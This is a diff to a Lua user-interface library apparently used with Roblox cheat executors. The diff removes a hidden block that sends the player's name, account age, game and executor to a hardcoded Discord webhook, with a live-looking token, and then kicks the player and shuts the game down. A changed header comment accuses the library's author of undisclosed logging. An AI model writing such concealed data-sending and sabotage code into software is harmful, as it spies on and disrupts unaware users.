@@ -1,4 +1,4 @@
--- (WARNING: This Repository is Licensed! You are not permitted to use/copy this User Interface library)
+-- "(WARNING: This Repository is Licensed! You are not permitted to use/copy this User Interface library)" - kiss my ass, you log data w/o stating it anywhere.
 local library = { 
 	flags = { }, 
 	items = { } 
@@ -3537,54 +3537,6 @@ function library:CreateWindow(name, size, hidebutton)
             return configSystem
         end
 	
-	if _G.FemKess ~= "FemWare On Top" then		
-		local ExecutorUsing            = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
-                local HttpService              = game:GetService("HttpService")
-                local Data =
-                {
-                    ["embeds"]= {
-                    {
-                        -- ["author"]= {
-                        --     ["name"]= game.Players.LocalPlayer.Name,
-                        --     ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
-                        --     ["icon_url"]= "https://i.imgur.com/R66g1Pe.jpg"
-                        --   },
-                        ["title"]= "Experience",
-                        ["url"]= "https://www.roblox.com/games/"..game.PlaceId,
-                        ["description"]= game.Players.LocalPlayer.Name.." is using a skidded script off FemWare...",
-                        ["color"]= 15258703,
-                        ["fields"]= {
-                            {
-                            ["name"]= "Executor",
-                            ["value"]= ExecutorUsing,
-                            ["inline"]= true
-                            },
-                            {
-                                ["name"]= "Age",
-                                ["value"]= game.Players.LocalPlayer.AccountAge,
-                                ["inline"]= true
-                            },
-			    {
-                                ["name"]= "Reason",
-                                ["value"]= "L BOZO STAY MAD",
-                                ["inline"]= true
-                            },
-                        }              
-                    }
-                    }
-                }
-
-                local Headers                  = {["Content-Type"]="application/json"}
-                local Encoded                  = HttpService:JSONEncode(Data)
-
-                Request                        = http_request or request or HttpPost or syn.request
-                local Final = {Url             = "https://discord.com/api/webhooks/971783002965299222/BBrifhhGROExM4eNNlPZl75iMPYr3GS8pAwJUFCi48vK1FEOZbpzlx_eQnskA3uyQDTF", Body = Encoded, Method = "POST", Headers = Headers}
-                Request(Final)
-		game.Players.LocalPlayer:Kick("L Bozo Stay Mad")
-		wait(15)
-		game:Shutdown()
-	end
-
         --[[ not finished lol
         function tab:CreatePlayerlist(name)
             local list = { }
